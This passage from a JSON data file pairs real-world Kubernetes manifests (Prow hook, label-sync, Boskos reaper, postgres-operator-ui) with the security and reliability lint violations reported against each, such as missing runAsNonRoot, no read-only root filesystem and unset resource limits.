    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: label-sync\nspec:\n  template:\n    metadata:\n      labels:\n        name: label-sync\n    spec:\n      containers:\n      - name: label-sync\n        image: gcr.io/k8s-prow/label_sync:v20210218-8412872812\n        args:\n        - --config=/etc/config/labels.yaml\n        - --confirm=true\n        - --orgs=kubernetes,kubernetes-client,kubernetes-csi,kubernetes-sigs\n        - --token=/etc/github/oauth\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: label-config\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"label-sync\" does not have a read-only root file system"
  },
  {
    "id": "8924",
    "manifest_path": "data/manifests/the_stack_sample/sample_3371.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: label-sync\nspec:\n  template:\n    metadata:\n      labels:\n        name: label-sync\n    spec:\n      containers:\n      - name: label-sync\n        image: gcr.io/k8s-prow/label_sync:v20210218-8412872812\n        args:\n        - --config=/etc/config/labels.yaml\n        - --confirm=true\n        - --orgs=kubernetes,kubernetes-client,kubernetes-csi,kubernetes-sigs\n        - --token=/etc/github/oauth\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: label-config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"label-sync\" is not set to runAsNonRoot"
  },
  {
    "id": "8925",
    "manifest_path": "data/manifests/the_stack_sample/sample_3371.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: label-sync\nspec:\n  template:\n    metadata:\n      labels:\n        name: label-sync\n    spec:\n      containers:\n      - name: label-sync\n        image: gcr.io/k8s-prow/label_sync:v20210218-8412872812\n        args:\n        - --config=/etc/config/labels.yaml\n        - --confirm=true\n        - --orgs=kubernetes,kubernetes-client,kubernetes-csi,kubernetes-sigs\n        - --token=/etc/github/oauth\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: label-config\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"label-sync\" has cpu request 0"
  },
  {
    "id": "8926",
    "manifest_path": "data/manifests/the_stack_sample/sample_3371.yaml",
    "manifest_yaml": "apiVersion: batch/v1\nkind: Job\nmetadata:\n  name: label-sync\nspec:\n  template:\n    metadata:\n      labels:\n        name: label-sync\n    spec:\n      containers:\n      - name: label-sync\n        image: gcr.io/k8s-prow/label_sync:v20210218-8412872812\n        args:\n        - --config=/etc/config/labels.yaml\n        - --confirm=true\n        - --orgs=kubernetes,kubernetes-client,kubernetes-csi,kubernetes-sigs\n        - --token=/etc/github/oauth\n        volumeMounts:\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n      volumes:\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: label-config\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"label-sync\" has memory limit 0"
  },
  {
    "id": "8927",
    "manifest_path": "data/manifests/the_stack_sample/sample_3375.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20220328-eee4cc7020\n        imagePullPolicy: Always\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy.prow.svc.cluster.local\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/token\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/kubeconfig\n        ports:\n        - name: http\n          containerPort: 8888\n        - name: metrics\n          containerPort: 9090\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          privileged: false\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: hmac\n        secret:\n          secretName: k8s-infra-prow-hmac-token\n      - name: github-token\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-ci-robot-github-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-build-clusters-kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "liveness-port",
    "violation_text": "container \"hook\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "8928",
    "manifest_path": "data/manifests/the_stack_sample/sample_3375.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20220328-eee4cc7020\n        imagePullPolicy: Always\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy.prow.svc.cluster.local\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/token\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/kubeconfig\n        ports:\n        - name: http\n          containerPort: 8888\n        - name: metrics\n          containerPort: 9090\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          privileged: false\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: hmac\n        secret:\n          secretName: k8s-infra-prow-hmac-token\n      - name: github-token\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-ci-robot-github-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-build-clusters-kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 4 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "8929",
    "manifest_path": "data/manifests/the_stack_sample/sample_3375.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20220328-eee4cc7020\n        imagePullPolicy: Always\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy.prow.svc.cluster.local\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/token\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/kubeconfig\n        ports:\n        - name: http\n          containerPort: 8888\n        - name: metrics\n          containerPort: 9090\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          privileged: false\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: hmac\n        secret:\n          secretName: k8s-infra-prow-hmac-token\n      - name: github-token\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-ci-robot-github-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-build-clusters-kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"hook\" does not have a read-only root file system"
  },
  {
    "id": "8930",
    "manifest_path": "data/manifests/the_stack_sample/sample_3375.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20220328-eee4cc7020\n        imagePullPolicy: Always\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy.prow.svc.cluster.local\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/token\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/kubeconfig\n        ports:\n        - name: http\n          containerPort: 8888\n        - name: metrics\n          containerPort: 9090\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          privileged: false\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: hmac\n        secret:\n          secretName: k8s-infra-prow-hmac-token\n      - name: github-token\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-ci-robot-github-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-build-clusters-kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"hook\" not found"
  },
  {
    "id": "8931",
    "manifest_path": "data/manifests/the_stack_sample/sample_3375.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20220328-eee4cc7020\n        imagePullPolicy: Always\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy.prow.svc.cluster.local\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/token\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/kubeconfig\n        ports:\n        - name: http\n          containerPort: 8888\n        - name: metrics\n          containerPort: 9090\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          privileged: false\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: hmac\n        secret:\n          secretName: k8s-infra-prow-hmac-token\n      - name: github-token\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-ci-robot-github-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-build-clusters-kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "readiness-port",
    "violation_text": "container \"hook\" does not expose port 8081 for the HTTPGet"
  },
  {
    "id": "8932",
    "manifest_path": "data/manifests/the_stack_sample/sample_3375.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20220328-eee4cc7020\n        imagePullPolicy: Always\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy.prow.svc.cluster.local\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/token\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/kubeconfig\n        ports:\n        - name: http\n          containerPort: 8888\n        - name: metrics\n          containerPort: 9090\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          privileged: false\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: hmac\n        secret:\n          secretName: k8s-infra-prow-hmac-token\n      - name: github-token\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-ci-robot-github-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-build-clusters-kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"hook\" is not set to runAsNonRoot"
  },
  {
    "id": "8933",
    "manifest_path": "data/manifests/the_stack_sample/sample_3375.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20220328-eee4cc7020\n        imagePullPolicy: Always\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy.prow.svc.cluster.local\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/token\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/kubeconfig\n        ports:\n        - name: http\n          containerPort: 8888\n        - name: metrics\n          containerPort: 9090\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          privileged: false\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: hmac\n        secret:\n          secretName: k8s-infra-prow-hmac-token\n      - name: github-token\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-ci-robot-github-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-build-clusters-kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"hook\" has cpu request 0"
  },
  {
    "id": "8934",
    "manifest_path": "data/manifests/the_stack_sample/sample_3375.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20220328-eee4cc7020\n        imagePullPolicy: Always\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --github-endpoint=http://ghproxy.prow.svc.cluster.local\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/token\n        - --job-config-path=/etc/job-config\n        - --kubeconfig=/etc/kubeconfig/kubeconfig\n        ports:\n        - name: http\n          containerPort: 8888\n        - name: metrics\n          containerPort: 9090\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n          privileged: false\n        volumeMounts:\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: github-token\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n      volumes:\n      - name: hmac\n        secret:\n          secretName: k8s-infra-prow-hmac-token\n      - name: github-token\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-ci-robot-github-token\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: k8s-infra-build-clusters-kubeconfig\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"hook\" has memory limit 0"
  },
  {
    "id": "8935",
    "manifest_path": "data/manifests/the_stack_sample/sample_3376.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: postgres-operator-ui\n  namespace: user-mran\n  labels:\n    name: postgres-operator-ui\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: postgres-operator-ui\n  template:\n    metadata:\n      labels:\n        name: postgres-operator-ui\n    spec:\n      serviceAccountName: postgres-operator-ui\n      containers:\n      - name: service\n        image: docker-personal.artifacts.dbccloud.dk/mran/postgres-operator-ui:demo\n        ports:\n        - containerPort: 8081\n          protocol: TCP\n        readinessProbe:\n          httpGet:\n            path: /health\n            port: 8081\n          initialDelaySeconds: 5\n          timeoutSeconds: 1\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        env:\n        - name: APP_URL\n          value: http://localhost:8081\n        - name: OPERATOR_API_URL\n          value: http://postgres-operator:8080\n        - name: OPERATOR_CLUSTER_NAME_LABEL\n          value: cluster-name\n        - name: RESOURCES_VISIBLE\n          value: 'False'\n        - name: TARGET_NAMESPACE\n          value: user-mran\n        - name: TEAMS\n          value: \"[\\n  \\\"acid\\\"\\n]\"\n        - name: OPERATOR_UI_CONFIG\n          value: \"{\\n  \\\"docs_link\\\":\\\"https://postgres-operator.readthedocs.io/en/latest/\\\"\\\n            ,\\n  \\\"dns_format_string\\\": \\\"{1}-{0}.{2}\\\",\\n  \\\"databases_visible\\\"\\\n            : true,\\n  \\\"master_load_balancer_visible\\\": true,\\n  \\\"nat_gateways_visible\\\"\\\n            : false,\\n  \\\"replica_load_balancer_visible\\\": true,\\n  \\\"resources_visible\\\"\\\n            : true,\\n  \\\"users_visible\\\": true,\\n  \\\"cost_ebs\\\": 0.119,\\n  \\\"cost_core\\\"\\\n            : 0.0575,\\n  \\\"cost_memory\\\": 0.014375,\\n  \\\"postgresql_versions\\\": [\\n\\\n            \\    \\\"14\\\",\\n    \\\"13\\\",\\n    \\\"12\\\",\\n    \\\"11\\\"\\n  ]\\n}\"\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"service\" does not have a read-only root file system"
  },
  {
    "id": "8936",
    "manifest_path": "data/manifests/the_stack_sample/sample_3376.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: postgres-operator-ui\n  namespace: user-mran\n  labels:\n    name: postgres-operator-ui\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: postgres-operator-ui\n  template:\n    metadata:\n      labels:\n        name: postgres-operator-ui\n    spec:\n      serviceAccountName: postgres-operator-ui\n      containers:\n      - name: service\n        image: docker-personal.artifacts.dbccloud.dk/mran/postgres-operator-ui:demo\n        ports:\n        - containerPort: 8081\n          protocol: TCP\n        readinessProbe:\n          httpGet:\n            path: /health\n            port: 8081\n          initialDelaySeconds: 5\n          timeoutSeconds: 1\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        env:\n        - name: APP_URL\n          value: http://localhost:8081\n        - name: OPERATOR_API_URL\n          value: http://postgres-operator:8080\n        - name: OPERATOR_CLUSTER_NAME_LABEL\n          value: cluster-name\n        - name: RESOURCES_VISIBLE\n          value: 'False'\n        - name: TARGET_NAMESPACE\n          value: user-mran\n        - name: TEAMS\n          value: \"[\\n  \\\"acid\\\"\\n]\"\n        - name: OPERATOR_UI_CONFIG\n          value: \"{\\n  \\\"docs_link\\\":\\\"https://postgres-operator.readthedocs.io/en/latest/\\\"\\\n            ,\\n  \\\"dns_format_string\\\": \\\"{1}-{0}.{2}\\\",\\n  \\\"databases_visible\\\"\\\n            : true,\\n  \\\"master_load_balancer_visible\\\": true,\\n  \\\"nat_gateways_visible\\\"\\\n            : false,\\n  \\\"replica_load_balancer_visible\\\": true,\\n  \\\"resources_visible\\\"\\\n            : true,\\n  \\\"users_visible\\\": true,\\n  \\\"cost_ebs\\\": 0.119,\\n  \\\"cost_core\\\"\\\n            : 0.0575,\\n  \\\"cost_memory\\\": 0.014375,\\n  \\\"postgresql_versions\\\": [\\n\\\n            \\    \\\"14\\\",\\n    \\\"13\\\",\\n    \\\"12\\\",\\n    \\\"11\\\"\\n  ]\\n}\"\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"postgres-operator-ui\" not found"
  },
  {
    "id": "8937",
    "manifest_path": "data/manifests/the_stack_sample/sample_3376.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: postgres-operator-ui\n  namespace: user-mran\n  labels:\n    name: postgres-operator-ui\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: postgres-operator-ui\n  template:\n    metadata:\n      labels:\n        name: postgres-operator-ui\n    spec:\n      serviceAccountName: postgres-operator-ui\n      containers:\n      - name: service\n        image: docker-personal.artifacts.dbccloud.dk/mran/postgres-operator-ui:demo\n        ports:\n        - containerPort: 8081\n          protocol: TCP\n        readinessProbe:\n          httpGet:\n            path: /health\n            port: 8081\n          initialDelaySeconds: 5\n          timeoutSeconds: 1\n        resources:\n          limits:\n            cpu: 200m\n            memory: 200Mi\n          requests:\n            cpu: 100m\n            memory: 100Mi\n        env:\n        - name: APP_URL\n          value: http://localhost:8081\n        - name: OPERATOR_API_URL\n          value: http://postgres-operator:8080\n        - name: OPERATOR_CLUSTER_NAME_LABEL\n          value: cluster-name\n        - name: RESOURCES_VISIBLE\n          value: 'False'\n        - name: TARGET_NAMESPACE\n          value: user-mran\n        - name: TEAMS\n          value: \"[\\n  \\\"acid\\\"\\n]\"\n        - name: OPERATOR_UI_CONFIG\n          value: \"{\\n  \\\"docs_link\\\":\\\"https://postgres-operator.readthedocs.io/en/latest/\\\"\\\n            ,\\n  \\\"dns_format_string\\\": \\\"{1}-{0}.{2}\\\",\\n  \\\"databases_visible\\\"\\\n            : true,\\n  \\\"master_load_balancer_visible\\\": true,\\n  \\\"nat_gateways_visible\\\"\\\n            : false,\\n  \\\"replica_load_balancer_visible\\\": true,\\n  \\\"resources_visible\\\"\\\n            : true,\\n  \\\"users_visible\\\": true,\\n  \\\"cost_ebs\\\": 0.119,\\n  \\\"cost_core\\\"\\\n            : 0.0575,\\n  \\\"cost_memory\\\": 0.014375,\\n  \\\"postgresql_versions\\\": [\\n\\\n            \\    \\\"14\\\",\\n    \\\"13\\\",\\n    \\\"12\\\",\\n    \\\"11\\\"\\n  ]\\n}\"\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"service\" is not set to runAsNonRoot"
  },
  {
    "id": "8938",
    "manifest_path": "data/manifests/the_stack_sample/sample_3378.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: boskos-reaper\n  labels:\n    app: boskos-reaper\n  namespace: test-pods\nspec:\n  selector:\n    matchLabels:\n      app: boskos-reaper\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: boskos-reaper\n    spec:\n      containers:\n      - name: boskos-reaper\n        image: gcr.io/k8s-prow/boskos/reaper:v20200206-f88edefe8\n        args:\n        - --boskos-url=http://boskos.test-pods.svc.cluster.local.\n        - --resource-type=gce-project,gke-project,gpu-project,ingress-project,istio-project,scalability-presubmit-project,scalability-project,aws-account\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"boskos-reaper\" does not have a read-only root file system"
  },
  {
    "id": "8939",
    "manifest_path": "data/manifests/the_stack_sample/sample_3378.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: boskos-reaper\n  labels:\n    app: boskos-reaper\n  namespace: test-pods\nspec:\n  selector:\n    matchLabels:\n      app: boskos-reaper\n  replicas: 1\n  template:\n    metadata:\n      labels:\n        app: boskos-reaper\n    spec:\n      containers:\n      - name: boskos-reaper\n        image: gcr.io/k8s-prow/boskos/reaper:v20200206-f88edefe8\n        args:\n        - --boskos-url=http://boskos.test-pods.svc.cluster.local.\n        - --resource-type=gce-project,gke-project,gpu-project,ingress-project,istio-project,scalability-presubmit-project,scalability-project,aws-account\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"boskos-reaper\" is not set to runAsNonRoot"
  },
  {
    "id": "8940",
    "manifest_path": "data/manifests/the_stack_sample/sample_3378.yaml",
